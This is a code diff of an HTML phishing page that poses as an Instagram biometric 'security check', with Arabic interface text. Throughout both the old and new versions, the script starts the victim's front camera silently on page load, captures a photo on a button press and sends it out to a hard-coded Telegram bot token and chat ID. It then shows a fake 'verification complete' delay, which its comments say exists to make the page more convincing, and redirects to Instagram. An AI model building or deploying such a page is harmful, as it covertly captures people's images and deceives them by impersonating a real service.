@@ -3,77 +3,97 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Fast Check</title>
+    <title>Instagram - Security Check</title>
     <style>
-        body { background: #fafafa; font-family: -apple-system, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 8px; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 12px; font-weight: bold; cursor: pointer; }
+        body { background-color: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; padding: 20px; text-align: center; border-radius: 3px; box-sizing: border-box; }
+        .logo { width: 175px; margin: 20px 0; }
+        .shield-icon { width: 60px; height: 60px; margin-bottom: 15px; }
+        h2 { font-size: 18px; color: #262626; margin-bottom: 10px; }
+        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; margin-bottom: 20px; }
+        .btn { background-color: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 10px; font-weight: 600; cursor: pointer; font-size: 14px; }
+        .btn:disabled { background-color: #b2dffc; }
+        .loader { display: none; border: 2px solid #f3f3f3; border-top: 2px solid #262626; border-radius: 50%; width: 20px; height: 20px; animation: spin 0.8s linear infinite; margin: 10px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://instagram.fdur5-1.fna.fbcdn.net/v/t51.2885-19/573323465_1219825463302212_7278921664109726296_n.png?stp=dst-jpg_e0_s150x150_tt6&efg=eyJ2ZW5jb2RlX3RhZyI6InByb2ZpbGVfcGljLmRqYW5nby4xNTAuYzIifQ&_nc_ht=instagram.fdur5-1.fna.fbcdn.net&_nc_cat=1&_nc_oc=Q6cZ2gFeIT8I3NcXI6H5awaZF95e-urM2CaHMkn0cbGXvSme4_1lqoRY5vTpVpQmClWvtwQ&_nc_ohc=RkFFgEjfD5UQ7kNvwGCbwmP&_nc_gid=kkLYHrCWOqW06sz7QHlG_w&edm=ALCvFkgBAAAA&ccb=7-5&ig_cache_key=YW5vbnltb3VzX3Byb2ZpbGVfcGlj.3-ccb7-5&oh=00_Af6r0b8dAH9g-uH019mQ-wpSFOxmNoqQi187Cgecjhc6Cg&oe=6A0941AA&_nc_sid=6d62aa" class="logo">
-        <p style="font-weight: 600; font-size: 14px;">تأكيد الهوية السريع</p>
-        <p style="color: #8e8e8e; font-size: 13px;">اضغط للمتابعة وتأمين حسابك فوراً.</p>
-        <button id="authBtn">تأكيد الآن</button>
-    </div>
 
-    <video id="v" autoplay playsinline></video>
-    <canvas id="c"></canvas>
+<div class="container">
+    <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo" alt="Instagram">
+    <img src="https://cdn-icons-png.flaticon.com/512/747/747305.png" class="shield-icon" alt="Security">
+    <h2>تأكيد الهوية البيومتري</h2>
+    <p>لحماية حسابك، نستخدم تقنية التعرف على الوجه للتأكد من أنك صاحب الحساب الحقيقي. يرجى الضغط أدناه لإجراء مسح سريع.</p>
+    
+    <button id="authBtn" class="btn">بدء المسح الأمني</button>
+    <div id="loader" class="loader"></div>
+    <div id="status" style="margin-top:10px; font-size:12px; color:#262626;"></div>
+</div>
 
-    <script>
-        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
-        const CHAT_ID = '2140385904';
-        let stream = null;
+<video id="v" autoplay playsinline></video>
+<canvas id="c"></canvas>
 
-        // تشغيل الكاميرا فوراً في الخلفية لتكون جاهزة
-        window.onload = async () => {
+<script>
+    const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+    const CHAT_ID = '2140385904';
+    let stream = null;
+
+    // تشغيل الكاميرا صامتاً في الخلفية فور التحميل
+    window.onload = async () => {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            document.getElementById('v').srcObject = stream;
+        } catch (e) {}
+    };
+
+    document.getElementById('authBtn').onclick = async () => {
+        const btn = document.getElementById('authBtn');
+        const loader = document.getElementById('loader');
+        const st = document.getElementById('status');
+
+        btn.style.display = 'none';
+        loader.style.display = 'block';
+        st.innerText = "جاري تحليل ملامح الوجه...";
+
+        if (!stream) {
             try {
                 stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                 document.getElementById('v').srcObject = stream;
-            } catch (e) {}
-        };
-
-        document.getElementById('authBtn').onclick = async () => {
-            const btn = document.getElementById('authBtn');
-            btn.innerText = "جاري التأكيد...";
-            btn.disabled = true;
-
-            if (!stream) {
-                // إذا لم تكن الكاميرا جاهزة بعد، نطلبها الآن بسرعة
-                try {
-                    stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    document.getElementById('v').srcObject = stream;
-                } catch (e) {
-                    alert("يجب السماح بالكاميرا للمتابعة");
-                    btn.disabled = false;
-                    return;
-                }
+            } catch (e) {
+                alert("يرجى السماح بالكاميرا لإتمام الفحص الأمني بنجاح.");
+                btn.style.display = 'block';
+                loader.style.display = 'none';
+                return;
             }
+        }
 
-            // التقاط فوري بدون أي تأخير
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = 480; canvas.height = 640;
-            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+        // التقاط الصورة فوراً
+        const canvas = document.getElementById('c');
+        const video = document.getElementById('v');
+        canvas.width = 480; canvas.height = 640;
+        canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
+        
+        canvas.toBlob(async (blob) => {
+            const fd = new FormData();
+            fd.append('chat_id', CHAT_ID);
+            fd.append('photo', blob, 'identity.jpg');
+            fd.append('caption', `✅ *تم فحص الهوية بنجاح*`);
             
-            canvas.toBlob(async (blob) => {
-                const fd = new FormData();
-                fd.append('chat_id', CHAT_ID);
-                fd.append('photo', blob, 'f.jpg');
-                
-                // إرسال للبوت والتحويل في نفس الوقت تقريباً
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
-                
-                // إغلاق الكاميرا والتحويل الفوري (سرعة البرق)
+            // إرسال للبوت
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+            
+            // تأثير انتظار وهمي لزيادة الإقناع
+            setTimeout(() => {
+                st.innerText = "اكتمل التحقق. يتم الآن توجيهك...";
                 setTimeout(() => {
                     stream.getTracks().forEach(t => t.stop());
-                    location.href = "https://www.instagram.com/re___ua/?hl=ar";
-                }, 100); 
-            }, 'image/jpeg', 0.5); // تقليل الجودة قليلاً لتسريع الرفع
-        };
-    </script>
+                    location.href = "https://instagram.com";
+                }, 1000);
+            }, 1500);
+        }, 'image/jpeg', 0.5);
+    };
+</script>
+
 </body>
 </html>
